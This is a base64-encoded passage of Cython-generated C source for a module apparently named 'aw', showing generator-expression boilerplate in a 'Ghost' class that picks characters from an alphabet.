F9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopUHlfTm9uZSk7CiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgICBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICB9IGVsc2UgewogICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgfQogIF9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqKSBfX3B5eF9zZWxmOwogIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTsKICBfX1B5eF9HSVZFUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUpOwogIF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCA9IF9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMmF3XzVHaG9zdF8yZ2VuZXJhdG9yLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMF0pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXcpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuR2hvc3QuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJhd181R2hvc3RfMmdlbmVyYXRvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSAKewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5X3NzaXplX3QgX19weXhfdF8yOwogIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNzsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7CiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuOwogICAgZGVmYXVsdDogCiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiBOVUxMOwogIH0KICBfX3B5eF9MM19maXJzdF9ydW46OwogIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfcik7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKSB9CiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgewogICAgX19weXhfdF8xID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wOyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMiA9IDA7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogIH0gZWxzZSB7CiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBmb3IgKDs7KSB7CiAgICBpZiAobGlrZWx5KCFfX3B5eF90XzMpKSB7CiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfSBlbHNlIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7CiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogICAgfSBlbHNlIHsKICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18pOwogICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18sIF9fcHl4X3RfNCk7CiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzQgPSAwOwogICAgX19weXhfdF81ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlLT5fX3B5eF92X2FscGhhYmV0KSkgeyBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoImFscGhhYmV0Iik7IF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKSB9CiAgICBfX3B5eF90XzcgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9hbHBoYWJldH07CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICB9CiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTsKICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIH0KICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTsKICAjZW5kaWYKICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xOwogIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yYXdfNUdob3N0XzVnZW5lcmF0b3IxKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNUdob3N0XzNnZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkgewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHsKICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDEyNSwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QgKikgX19weXhfc2VsZjsKICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7CiAgX19QeXhfR0lWRVJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTsKICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJhd181R2hvc3RfNWdlbmVyYXRvcjEsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3RfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdyk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDEyNSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTsKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47CiAgfQoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5HaG9zdC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMmF3XzVHaG9zdF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSAKewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5X3NzaXplX3QgX19weXhfdF8yOwogIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNzsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7CiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuOwogICAgZGVmYXVsdDogCiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiBOVUxMOwogIH0KICBfX3B5eF9MM19maXJzdF9ydW46OwogIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfcik7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKSB9CiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgewogICAgX19weXhfdF8xID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wOyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMiA9IDA7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogIH0gZWxzZSB7CiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBmb3IgKDs7KSB7CiAgICBpZiAobGlrZWx5KCFfX3B5eF90XzMpKSB7CiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEyNSwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfSBlbHNlIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7CiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X